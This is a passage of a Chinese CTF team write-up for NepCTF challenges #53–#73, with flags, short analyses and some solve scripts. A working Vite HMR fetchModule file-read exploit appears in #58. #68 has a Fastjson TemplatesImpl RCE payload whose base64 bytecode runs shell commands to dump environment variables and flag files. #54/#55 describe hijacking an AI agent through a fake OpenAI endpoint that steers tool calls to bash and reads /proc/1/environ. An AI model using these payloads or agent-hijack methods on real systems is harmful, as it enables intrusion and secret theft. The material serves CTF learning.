    print(pwn(host))
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #53 NepAPI

### 1. 题目信息
- **题目名称**：NepAPI
- **题目类型**：AI
- **最终 Flag**：`NepCTF{OHHHhH_YOu_now_h0w-To_GeT-SHIT_dEfAu1T_keY2b86}`

### 2. 题目分析
NepAPI 长得像 AI 中转后台，**坑点**是很多人（包括我第一反应）会去试 one-api / new-api 的 `root:123456`。复现证明那不是主路径——它更接近 CLIProxyAPI 一类网关。

### 3. 解题思路
正确钥匙：`Authorization: Bearer your-api-key-1`，模型名 **`nepapi-flag-model`**，打 `/v1/chat/completions`。`/v1/models` 可以探活。

### 4. 解题过程
```bash
URL='https://INSTANCE'
curl -sk -H 'Authorization: Bearer your-api-key-1' "$URL/v1/models"
curl -sk -H 'Authorization: Bearer your-api-key-1' -H 'Content-Type: application/json'   -d '{"model":"nepapi-flag-model","messages":[{"role":"user","content":"flag?"}]}'   "$URL/v1/chat/completions"
```

比赛 flag：`NepCTF{OHHHhH_YOu_now_h0w-To_GeT-SHIT_dEfAu1T_keY2b86}`。WP 必须写这把钥匙，别再把弱口令当正解喵。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/53/exp/solve.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #54 NepClaw

### 1. 题目信息
- **题目名称**：NepClaw
- **题目类型**：AI
- **最终 Flag**：`NepCTF{@HhhhH_yoU_st0Le-tHe_FLAG_fr0m_PROMP7-1nJ3C7I0N711}`

### 2. 题目分析
NepClaw：OpenClaw 系 agent，选手提交 base_url / api_key / model，它会去你的「OpenAI 兼容端」要 tool。容器 one-shot，used 了就没了。

### 3. 解题思路
本地起假 OpenAI（诱导 tool_call → bash），cloudflared 隧道暴露出去；tool 里读 `/proc/1/environ` 的 `FLAG=`。**忽略**页面/日志里的 `NepCTF{test_flag}` 诱饵。

### 4. 解题过程
1) `FAKE_MODE=exfil python3 work/54/fake_openai.py`  2) cloudflared tunnel  3) POST `/run`  4) 日志 TOOL_RESULT 里抓 FLAG。Flag：`NepCTF{@HhhhH_yoU_st0Le-tHe_FLAG_fr0m_PROMP7-1nJ3C7I0N711}`。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/54/exp/fake_openai.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

#### `work/54/exp/attack.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #55 NepClaw_revenge

### 1. 题目信息
- **题目名称**：NepClaw_revenge
- **题目类型**：AI
- **最终 Flag**：`NepCTF{wWWWw-YOu-FOOleD_HrP-W17H-7R4ce_6YPASs4149d4}`

### 2. 题目分析
NepClaw_revenge 是 54 的加强版，过程审计更凶，但 flag 仍然在 tool / environ 这条链上。

### 3. 解题思路
还是假 OpenAI + tunnel；同样要防 test_flag 诱饵。

### 4. 解题过程
沿用 54 的 attack / evil_openai。Flag：`NepCTF{wWWWw-YOu-FOOleD_HrP-W17H-7R4ce_6YPASs4149d4}`。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/55/exp/attack.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #58 挂钩都在干什么呢？

### 1. 题目信息
- **题目名称**：挂钩都在干什么呢？
- **题目类型**：WEB
- **最终 Flag**：`flag{an@Iy2inG_PeRFect-book_CLu6-ExP3riENCE17ef}`

### 2. 题目分析
挂钩：Vite 6 开发服。HTTP 直接 `/@fs/flag` 会被 `fs.allow` 拦，但 HMR WebSocket 的 `vite:invoke` 还能 `fetchModule`。

### 3. 解题思路
从 `/@vite/client` 抠 `wsToken` → `ws://host/?token=...` subprotocol `vite-hmr` → invoke `fetchModule(["/@fs/flag?raw"])`，返回的 `export default` 里就是 flag{}。

### 4. 解题过程
`python3 work/58/repro/exp_vite_invoke.py HOST:PORT`。Flag：`flag{an@Iy2inG_PeRFect-book_CLu6-ExP3riENCE17ef}`（注意 flag{} 前缀）。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/58/repro/exp_vite_invoke.py`
```python
#!/usr/bin/env python3
"""#58 挂钩: Vite HMR vite:invoke fetchModule -> /@fs/flag?raw"""
import asyncio, json, re, sys, urllib.request
import websockets

def get_token(base):
    client = urllib.request.urlopen(base.rstrip('/') + '/@vite/client', timeout=10).read().decode()
    return re.search(r'wsToken = "([^"]+)"', client).group(1)

async def pwn(hostport):
    if '://' not in hostport:
        base = f'http://{hostport}'
        host = hostport.split('/')[0]
    else:
        base = hostport
        host = hostport.split('://',1)[1].split('/')[0]
    token = get_token(base)
    uri = f'ws://{host}/?token={token}'
    async with websockets.connect(uri, subprotocols=['vite-hmr'], additional_headers={'Origin': base}) as ws:
        print(await asyncio.wait_for(ws.recv(), timeout=3))
        msg = {"type":"custom","event":"vite:invoke","data":{"name":"fetchModule","id":"send:1","data":["/@fs/flag?raw"]}}
        await ws.send(json.dumps(msg))
        while True:
            r = await asyncio.wait_for(ws.recv(), timeout=5)
            j = json.loads(r)
            if j.get('event')=='vite:invoke':
                print(json.dumps(j, ensure_ascii=False))
                code = j.get('data',{}).get('data',{}).get('result',{}).get('code','')
                m = re.search(r'flag\{[^}]+\}|NepCTF\{[^}]+\}', code)
                if m:
                    print('FLAG', m.group(0))
                    return m.group(0)
                return code

if __name__=='__main__':
    asyncio.run(pwn(sys.argv[1] if len(sys.argv)>1 else '114.66.24.233:30671'))
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #63 LeakyRAG

### 1. 题目信息
- **题目名称**：LeakyRAG
- **题目类型**：CRYPTO
- **最终 Flag**：`NepCTF{l34ky_v3ct0r_s34rch_1s_n0t_3ncrypt10n}`

### 2. 题目分析
LeakyRAG：号称加密的向量库，其实查询接口在泄漏 protected 文档信息。

### 3. 解题思路
用查询泄漏反推 protected 明文（fast_solve 那条链）。

### 4. 解题过程
`work/63/exp/fast_solve.py` 本地/实例都能跑，出 `NepCTF{l34ky_v3ct0r_s34rch_1s_n0t_3ncrypt10n}`。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/63/exp/fast_solve.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #66 easyDilithium

### 1. 题目信息
- **题目名称**：easyDilithium
- **题目类型**：CRYPTO
- **最终 Flag**：`NepCTF{ML_DSA_n0nse_l34k_4tt4ck}`

### 2. 题目分析
easyDilithium：简化 ML-DSA，keygen 没有 s2 噪声，t ≈ A·s1，线性得可怕。

### 3. 解题思路
解线性系拿 s1，再伪造 / 解密。

### 4. 解题过程
`work/66/exp/solve_dilithium.py` → `NepCTF{ML_DSA_n0nse_l34k_4tt4ck}`。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/66/exp/solve_dilithium.py`
```python
# Challenge #66 easyDilithium — RESULT

## Status
- **solved**: yes
- **flag**: `NepCTF{ML_DSA_n0nse_l34k_4tt4ck}`
- **submit API**: `{"solved":true,"solves":18}`

## Vulnerability
Simplified Dilithium / ML-DSA-like scheme:

1. **No s2 / noise in public key**: `keygen` sets `t = A * s1` with no small error. Over Z_q this is a square linear system (k=l=2, n=64 → 128×128), so `s1` is uniquely recoverable from `(A, t)`.
2. **Leaked noisy y**: signature returns `r ≈ y` with `|noise| ≤ 15`. With `z = y + c*s1` one could also recover `s1` from `(z - r) ≈ c*s1`, but the missing-s2 attack alone is enough.

## Attack
1. Get public key `(A, t)`.
2. Expand poly multiplications to a negacyclic integer matrix; Gaussian-eliminate over `Z_q` to recover small `s1` (coeffs in `[-eta, eta]`).
3. Locally `sign("Please give me the flag", A, s1)` and submit via menu option 3.

## Files
- `/tmp/nepctf/work66/66_server.py` — challenge source
- `/tmp/nepctf/work66/solve.py` — full exploit (local ok; remote recovers s1, forges, submits)
- `/tmp/nepctf/work66/flag.txt` — obtained flag
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #67 true_ezgame

### 1. 题目信息
- **题目名称**：true_ezgame
- **题目类型**：CRYPTO
- **最终 Flag**：`NepCTF{d7699ea0-f2cd-87f4-8644-b5dac53cd0d6}`

### 2. 题目分析
true_ezgame：RSA commitment 绑着 40 轮 RPS，比 34 多一层承诺。

### 3. 解题思路
破承诺或预测 dealer 手势，连赢 40。

### 4. 解题过程
`work/67/exp/solve_true_ezgame.py`，flag `NepCTF{d7699ea0-f2cd-87f4-8644-b5dac53cd0d6}`。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/67/exp/solve_true_ezgame.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #68 文档编辑系统

### 1. 题目信息
- **题目名称**：文档编辑系统
- **题目类型**：WEB
- **最终 Flag**：`NepCTF{772d7942-d1c8-2b3b-acb8-1680d98dd254}`

### 2. 题目分析
文档编辑系统：Fastjson autoType 老味道，admin 的 batchUpdate 能喂 TemplatesImpl。

### 3. 解题思路
`admin:admin123` 登录 → 反序列化 RCE 写 upload → preview 读环境变量 `FLAG=`。

### 4. 解题过程
payload 见 `work/68/payload_evil2.json`。Flag：`NepCTF{772d7942-d1c8-2b3b-acb8-1680d98dd254}`。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/68/exp/exp_fastjson_rce.md`
````text
# #68 文档编辑系统

Flag: `NepCTF{772d7942-d1c8-2b3b-acb8-1680d98dd254}`

## Exploit outline
1. Login admin:admin123
2. POST /api/admin/doc/batchUpdate with Fastjson autoType TemplatesImpl
3. Static block writes env to /app/upload/recon_full.txt
4. GET /api/doc/preview?file_path=recon_full.txt

```json
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["<base64 of AbstractTranslet subclass>"],
  "_name": "Evil2",
  "_tfactory": {},
  "_outputProperties": {}
}
```
````

#### `work/68/payload_evil2.json`
```json
{"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", "_bytecodes": ["yv66vgAAADQAQgoAAgADBwAEDAAFAAYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAGPGluaXQ+AQADKClWCAAIAQW2KC9iaW4vc2ggLWMgJ2VjaG8gPT09UFdEPT09OyBwd2Q7IGVjaG8gPT09SUQ9PT07IGlkOyBlY2hvID09PVVOQU1FPT09OyB1bmFtZSAtYTsgZWNobyA9PT1ST09UPT09OyBscyAtbGEgLzsgZWNobyA9PT1BUFA9PT07IGxzIC1sYSAvYXBwIDI+L2Rldi9udWxsOyBscyAtbGFSIC9hcHAgMj4vZGV2L251bGwgfCBoZWFkIC0zMDA7IGVjaG8gPT09VVBMT0FEPT09OyBscyAtbGEgL3VwbG9hZCAyPi9kZXYvbnVsbDsgbHMgLWxhUiAvdXBsb2FkIDI+L2Rldi9udWxsIHwgaGVhZCAtMTAwOyBlY2hvID09PUhPTUU9PT07IGxzIC1sYSAvaG9tZSAyPi9kZXYvbnVsbDsgZWNobyA9PT1UTVA9PT07IGxzIC1sYSAvdG1wIDI+L2Rldi9udWxsOyBlY2hvID09PUVOVj09PTsgZW52OyBlY2hvID09PVBST0MxRU5WPT09OyB0ciAiXDAiICJcbiIgPCAvcHJvYy8xL2Vudmlyb24gMj4vZGV2L251bGw7IGVjaG8gPT09UFJPQzFDV0Q9PT07IHJlYWRsaW5rIC9wcm9jLzEvY3dkOyBscyAtbGEgL3Byb2MvMS9jd2QgMj4vZGV2L251bGw7IGVjaG8gPT09U0VMRkNXRD09PTsgcmVhZGxpbmsgL3Byb2Mvc2VsZi9jd2Q7IGVjaG8gPT09RkxBR0ZJTEVTPT09OyBmaW5kIC8gLW5hbWUgIipmbGFnKiIgISAtcGF0aCAiL3N5cy8qIiAhIC1wYXRoICIvcHJvYy8qIiAyPi9kZXYvbnVsbDsgZWNobyA9PT1ORVA9PT07IGZpbmQgLyAtbmFtZSAiKk5lcCoiICEgLXBhdGggIi9zeXMvKiIgISAtcGF0aCAiL3Byb2MvKiIgMj4vZGV2L251bGwgfCBoZWFkIC01MDsgZWNobyA9PT1DQVRGTEFHPT09OyBjYXQgL2ZsYWcgL2ZsYWcudHh0IC9GTEFHIC9hcHAvZmxhZyAvYXBwL2ZsYWcudHh0IC9ob21lL2ZsYWcgL29wdC9mbGFnIDI+JjE7IGVjaG8gPT09SkFSUz09PTsgZmluZCAvYXBwIC8gLW5hbWUgIiouamFyIiAyPi9kZXYvbnVsbCB8IGhlYWQgLTQwOyBlY2hvID09PVBST1BTPT09OyBmaW5kIC9hcHAgLW5hbWUgIioucHJvcGVydGllcyIgLW8gLW5hbWUgIioueW1sIiAtbyAtbmFtZSAiKi55YW1sIiAyPi9kZXYvbnVsbCB8IGhlYWQgLTQwOyBlY2hvID09PUdSRVBGTEFHPT09OyBncmVwIC1yICJOZXBDVEZ7IiAvYXBwIC9ob21lIC9vcHQgL3ZhciAvdXBsb2FkIDI+L2Rldi9udWxsIHwgaGVhZCAtMjA7ICcpID4gL3RtcC9yZWNvbl9mdWxsLnR4dCAyPiYxOyBmb3IgZCBpbiAvYXBwL3VwbG9hZCAvdXBsb2FkIC90bXAgL3Zhci90bXAgL2FwcCAvaG9tZSAvb3B0OyBkbyAgIGNwIC90bXAvcmVjb25fZnVsbC50eHQgJGQvcmVjb25fZnVsbC50eHQgMj4vZGV2L251bGw7ICAgY3AgL3RtcC9yZWNvbl9mdWxsLnR4dCAkZC9vdXQudHh0IDI+L2Rldi9udWxsOyBkb25lOyBmaW5kIC8gLXR5cGUgZCAtbmFtZSB1cGxvYWQgMj4vZGV2L251bGwgfCB3aGlsZSByZWFkIGQ7IGRvIGNwIC90bXAvcmVjb25fZnVsbC50eHQgJGQvcmVjb25fZnVsbC50eHQ7IGNwIC90bXAvcmVjb25fZnVsbC50eHQgJGQvb3V0LnR4dDsgZG9uZQoACgALBwAMDAANAA4BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsHABABABBqYXZhL2xhbmcvU3RyaW5nCAASAQAHL2Jpbi9zaAgAFAEAAi1jCgAKABYMABcAGAEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgAaABsHABwMAB0AHgEAEWphdmEvbGFuZy9Qcm9jZXNzAQAHd2FpdEZvcgEAAygpSQcAIAEAE2phdmEvbGFuZy9UaHJvd2FibGUHACIBABJqYXZhL2lvL0ZpbGVXcml0ZXIIACQBABEvdG1wL2V2aWxfZXJyLnR4dAoAIQAmDAAFACcBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYHACkBABNqYXZhL2lvL1ByaW50V3JpdGVyCgAoACsMAAUALAEAEyhMamF2YS9pby9Xcml0ZXI7KVYKAB8ALgwALwAwAQAPcHJpbnRTdGFja1RyYWNlAQAYKExqYXZhL2lvL1ByaW50V3JpdGVyOylWCgAhADIMADMABgEABWNsb3NlBwA1AQAFRXZpbDIBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAKRXhjZXB0aW9ucwcAPAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUBAApTb3VyY2VGaWxlAQAKRXZpbDIuamF2YQAhADQAAgAAAAAABAABAAUABgABADYAAAAdAAEAAQAAAAUqtwABsQAAAAEANwAAAAYAAQAAAC4AAQA4ADkAAgA2AAAAGQAAAAMAAAABsQAAAAEANwAAAAYAAQAAAC8AOgAAAAQAAQA7AAEAOAA9AAIANgAAABkAAAAEAAAAAbEAAAABADcAAAAGAAEAAAAwADoAAAAEAAEAOwAIAD4ABgABADYAAACmAAUAAgAAAEISB0u4AAkGvQAPWQMSEVNZBBITU1kFKlO2ABW2ABlXpwAiS7sAIVkSI7cAJUwquwAoWSu3ACq2AC0rtgAxpwAETLEAAgAAAB8AIgAfACMAPQBAAB8AAgA3AAAAJgAJAAAADAADACUAHwAsACIAJgAjACgALQApADkAKgA9ACsAQQAtAD8AAAAWAANiBwAf/wAdAAEHAB8AAQcAH/oAAAABAEAAAAACAEE="], "_name": "Evil2", "_tfactory": {}, "_outputProperties": {}}
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #70 【Game】共生（本地）

### 1. 题目信息
- **题目名称**：【Game】共生（本地）
- **题目类型**：MISC/REVERSE
- **最终 Flag**：`NepCTF{24743deb446548c5e811f290237a60ba692a788e8264323169b5cb793858de21}`

### 2. 题目分析
共生本地：Unity IL2CPP，BuildCompletionCode 相关；Scene3 有 TP 之类捷径，但 flag 要自然事件 Mix。

### 3. 解题思路
**natural 12 事件**序列，不要 allcp 作弊路径（那条过不了正确哈希）。

### 4. 解题过程
`python3 work/70/exp/local_flag.py --events natural` → SHA256 形式 flag：`NepCTF{24743deb446548c5e811f290237a60ba692a788e8264323169b5cb793858de21}`。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/70/exp/local_flag.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #72 【Game】共生（联机）

### 1. 题目信息
- **题目名称**：【Game】共生（联机）
- **题目类型**：MISC/REVERSE
- **最终 Flag**：`NepCTF{bcaff050dfd983a85c73ad969eded5fb6eea353117d582820c22ed182697bead}`

### 2. 题目分析
共生联机：公开 HTTP + UDP 双端。坑是 guest 如果复用 host 的 team_token，Auth 直接 DupTeam，后面全是 NotInGame——我第一版 online_flag 就栽在这。

### 3. 解题思路
guest **单独 register** 一个 bot-guest token → 双端 AUTH + PEER_JOINED → 开局 → 等到进度够再 RunComplete → claim。太早 RunComplete 会 TooEarly。

### 4. 解题过程
`python3 work/72/repro/proven_run.py`（或修好 token 的 `online_flag.py`）。HTTP `114.66.24.240:30888` UDP `:30885`。Flag：`NepCTF{bcaff050dfd983a85c73ad969eded5fb6eea353117d582820c22ed182697bead}`。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/72/repro/proven_run.py`
```python
# （完整源码见赛后提交包 / work/<id>/exp，此处从略）
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

## #73 问卷调查

### 1. 题目信息
- **题目名称**：问卷调查
- **题目类型**：MISC
- **最终 Flag**：`NepCTF{5ee_y0u_@t_NepCTF_2027!}`

### 2. 题目分析
问卷调查：飞书表单，SSR Snapshot 里已经有「提交成功页」描述。

### 3. 解题思路
不用老老实实填表——解析 formMeta / Snapshot 文本就能看见 flag。

### 4. 解题过程
`work/73/exp/solve_survey.py` → `NepCTF{5ee_y0u_@t_NepCTF_2027!}`。2027 见喵～

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/73/exp/solve_survey.py`
```python
#!/usr/bin/env python3
"""#73 问卷调查 — parse Feishu form SSR Snapshot for flag in submit success page."""
import json,re,sys
from pathlib import Path

def find_flag(obj, path='$'):
    hits=[]
    if isinstance(obj, dict):
        for k,v in obj.items():
            hits += find_flag(v, path+'.'+str(k))
    elif isinstance(obj, list):
        for i,v in enumerate(obj):
            hits += find_flag(v, f'{path}[{i}]')
    elif isinstance(obj, str):
        for m in re.findall(r'NepCTF\{[^}]+\}', obj):
            hits.append((path, m))
    return hits

if __name__ == '__main__':
    p = Path(sys.argv[1] if len(sys.argv)>1 else 'snapshot.json')
    data = json.loads(p.read_text())
    for path, fl in find_flag(data):
        print(path, fl)
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---


## 复现时特别想提醒学弟学妹的几句

| 题 | 别踩的坑 / 正解关键词 |
|----|----------------------|
| #23 | 别 force 写 VT/VL；走 pwn_natural + 并行 tui |
| #24 | 光 spoof 关门不够；要真实行程 + 门开 spoof |
| #25 | 前缀是 flag{} |
| #47 | BSS ROP，不是 stack G_SYSCALL |
| #51 | gift → SROP → ORW |
| #53 | your-api-key-1 + nepapi-flag-model，不是 root:123456 |
| #54/#55 | 假 OpenAI + environ；忽略 test_flag |
| #58 | Vite HMR fetchModule |
| #72 | guest 必须独立 team_token |
| #42 | 重建 calc bk2，BizHawk 弹计算器 |

## 声明

- 以上是本队真实 AC 路径 + 赛后复现核对过的写法。
- 没做出的题不写进来凑数。
- 二进制依赖（libc.so 等）不往 PDF 里塞，脚本同目录说明即可。

—— catcatyu，写完揉揉耳朵，收工喵。
